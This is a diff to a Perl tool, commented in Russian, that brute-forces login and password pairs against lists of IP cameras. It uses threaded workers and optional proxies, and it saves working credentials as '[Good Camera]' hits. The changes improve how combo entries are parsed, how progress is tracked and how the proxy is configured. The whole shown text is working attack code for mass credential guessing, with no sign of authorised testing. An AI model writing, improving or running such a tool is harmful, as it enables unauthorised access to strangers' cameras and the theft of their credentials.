@@ -177,32 +177,51 @@ my $progress = Term::ProgressBar->new({
 });
 $progress->update(0);
 
-# Функция брутфорса логинов и паролей
+sub combo_to_pair {
+    my ($combo) = @_;
+
+    # Делим строку по не экранированному двоеточию
+    my ($login, $password) = split /(?<!\\):/, $combo;
+
+    # Обрабатываем экранирование
+    $login =~ s/\\(.)/$1/g;
+    $password =~ s/\\(.)/$1/g;
+
+    return ($login, $password);
+}
+
 sub bruteforce {
     my ($ip_address, $ua, $progress_bar, $combo_list) = @_;
 
-    my $tested_combos = 0;
     my $password_found = 0;
-    for my $combo (@$combo_list) {
-        my ($login, $password) = split /:/, $combo;
+    for my $i (0 .. $#{$combo_list}) {
+        my ($login, $password) = combo_to_pair $combo_list->[$i];
+
+        $progress_bar->message('[B][i] ' . $combo_list->[$i] . ' -> ' . $login . ' | ' . $password)
+            if $args->{debug};
+
+        if ($login =~ /:/) {
+            $progress_bar->message('[B][!] Colon is not allowed in username! Skip [ ' . $login . ' : ' . $password . ' ]');
+            $progress_bar->update();
+            next;
+        }
 
         if (login($ip_address, $login, $password, $ua)) {
+            $password_found = 1;
+
             $progress_bar->message('[Good Camera] ' . $login . ';' . $password . '@' . $ip_address);
             save_good($ip_address, $login, $password);
 
-            $progress_bar->update($progress_bar->last_update + ($tested_combos - $progress_bar->last_update));
-            $password_found = 1;
+            # Обновляем прогресс так, что бы скипнуть оставшиеся айтемы
+            $progress_bar->update($progress_bar->last_update + (($i + 1) - $progress_bar->last_update));
             last;
         }
         else {
-            $tested_combos++;
-            $progress_bar->update($progress_bar->last_update + 1);
+            $progress_bar->update();
         }
     }
 
-    $progress_bar->message('[Bad Camera] ' . $ip_address)
-        unless $password_found;
-
+    $progress_bar->message('[Bad Camera] ' . $ip_address) unless $password_found;
     return $password_found;
 }
 
@@ -214,10 +233,8 @@ $channel->shutdown;
 my @coroutines;
 for (1 .. $args->{threads}) {
     push @coroutines, async {
-        my $ua = LWP::UserAgent->new(
-            timeout => $args->{timeout},
-            proxy   => $args->{proxy} ? [ [ qw(http https) ] => $args->{proxy} ] : undef,
-        );
+        my $ua = LWP::UserAgent->new(timeout => $args->{timeout});
+        $ua->proxy([ qw(http https) ] => $args->{proxy}) if $args->{proxy};
 
         while (my $ip_address = $channel->get) {
 
